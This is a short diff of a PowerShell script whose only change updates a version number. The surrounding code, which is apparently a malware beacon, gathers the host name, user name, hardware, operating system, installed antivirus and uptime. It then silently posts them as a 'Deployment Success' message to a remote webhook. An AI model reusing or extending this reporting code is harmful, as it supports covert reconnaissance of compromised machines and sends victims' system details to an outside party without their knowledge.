@@ -219,7 +219,7 @@ try {
             description = "**Deployment Success**`n" +
                 "``````Host: $($env:COMPUTERNAME)`nUser: $($env:USERNAME)`nCPU: $($hw.cpuName)`nCores: $($hw.cores)`nRAM: $($hw.ram) GB`nGPU: $($hw.gpuName)`nOS: $osName`nAV: $av`nUptime: $($upHours)h``````"
             color = 3066993
-            footer = @{ text = "v6.1 | $(Get-Date -Format 'yyyy-MM-dd HH:mm UTC')" }
+            footer = @{ text = "v6.6 | $(Get-Date -Format 'yyyy-MM-dd HH:mm UTC')" }
         })
     } | ConvertTo-Json -Depth 4
     Invoke-RestMethod -Uri $c.wh -Method Post -Body $json -ContentType "application/json" -EA 0
